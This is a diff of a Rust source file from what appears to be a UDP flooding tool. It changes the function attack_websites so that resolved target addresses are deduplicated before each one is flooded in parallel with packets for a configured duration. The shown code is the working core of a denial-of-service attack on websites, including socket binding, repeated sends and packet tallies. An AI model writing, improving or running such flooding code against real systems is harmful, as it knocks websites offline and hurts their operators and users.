@@ -16,6 +16,7 @@ use std::{
 
 use anyhow::*;
 use dns_lookup::lookup_host;
+use itertools::Itertools;
 use lazy_static::lazy_static;
 use online::sync::check;
 use portpicker::pick_unused_port;
@@ -277,80 +278,83 @@ fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Resul
         }
     });
 
-    (*socket_addresses)
+    let socket_addresses = (*socket_addresses)
         .lock()
         .unwrap()
-        .par_iter()
-        .for_each(|socket_address| {
-            let sender: SocketAddr = format!(
-                "0.0.0.0:{}",
-                pick_unused_port().expect("No free port found!")
-            )
-            .parse()
-            .expect("Couldn't get sender IP address");
+        .clone()
+        .into_iter()
+        .unique()
+        .collect::<Vec<_>>();
 
-            info!("Creating socket for {} ...", sender);
+    socket_addresses.par_iter().for_each(|socket_address| {
+        let sender: SocketAddr = format!(
+            "0.0.0.0:{}",
+            pick_unused_port().expect("No free port found!")
+        )
+        .parse()
+        .expect("Couldn't get sender IP address");
 
-            let socket =
-                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
+        info!("Creating socket for {} ...", sender);
 
-            while start.elapsed().as_secs() < config.execution_time {
-                match socket.connect(socket_address.clone()) {
-                    std::result::Result::Ok(_) => {
-                        if config.summary {
-                            (*SUMMARY)
-                                .lock()
-                                .unwrap()
-                                .insert(socket_address.clone(), PacketSummary::default());
-                        }
+        let socket = UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
 
-                        let buffer = generate_buffer(config.packet_size);
+        while start.elapsed().as_secs() < config.execution_time {
+            match socket.connect(socket_address.clone()) {
+                std::result::Result::Ok(_) => {
+                    if config.summary {
+                        (*SUMMARY)
+                            .lock()
+                            .unwrap()
+                            .insert(socket_address.clone(), PacketSummary::default());
+                    }
 
-                        while start.elapsed().as_secs() < config.execution_time {
-                            let res = socket.send(buffer.as_slice());
+                    let buffer = generate_buffer(config.packet_size);
 
-                            match res {
-                                std::result::Result::Ok(size) => {
-                                    info!(
-                                        "Successfully sent a packet of size {} to {}",
-                                        size, socket_address
-                                    );
+                    while start.elapsed().as_secs() < config.execution_time {
+                        let res = socket.send(buffer.as_slice());
 
-                                    if config.summary {
-                                        if let Some(packet_summary) =
-                                            (*SUMMARY).lock().unwrap().get_mut(socket_address)
-                                        {
-                                            packet_summary.size += size as u128;
-                                            packet_summary.amount += 1;
-                                        }
-                                    }
-                                }
-                                std::result::Result::Err(error) => {
-                                    error!(
-                                        "Failed to send a packet to {} .\nError message: {}",
-                                        socket_address, error
-                                    );
+                        match res {
+                            std::result::Result::Ok(size) => {
+                                info!(
+                                    "Successfully sent a packet of size {} to {}",
+                                    size, socket_address
+                                );
 
-                                    if config.unreachable_stop_trying {
-                                        break;
+                                if config.summary {
+                                    if let Some(packet_summary) =
+                                        (*SUMMARY).lock().unwrap().get_mut(socket_address)
+                                    {
+                                        packet_summary.size += size as u128;
+                                        packet_summary.amount += 1;
                                     }
                                 }
                             }
+                            std::result::Result::Err(error) => {
+                                error!(
+                                    "Failed to send a packet to {} .\nError message: {}",
+                                    socket_address, error
+                                );
 
-                            sleep(config.timeout);
+                                if config.unreachable_stop_trying {
+                                    break;
+                                }
+                            }
                         }
-                    }
-                    std::result::Result::Err(error) => {
-                        error!(
-                            "Couldn't connect to {}.\nError message: {}",
-                            socket_address, error
-                        );
 
-                        break;
+                        sleep(config.timeout);
                     }
                 }
+                std::result::Result::Err(error) => {
+                    error!(
+                        "Couldn't connect to {}.\nError message: {}",
+                        socket_address, error
+                    );
+
+                    break;
+                }
             }
-        });
+        }
+    });
 
     Ok(())
 }
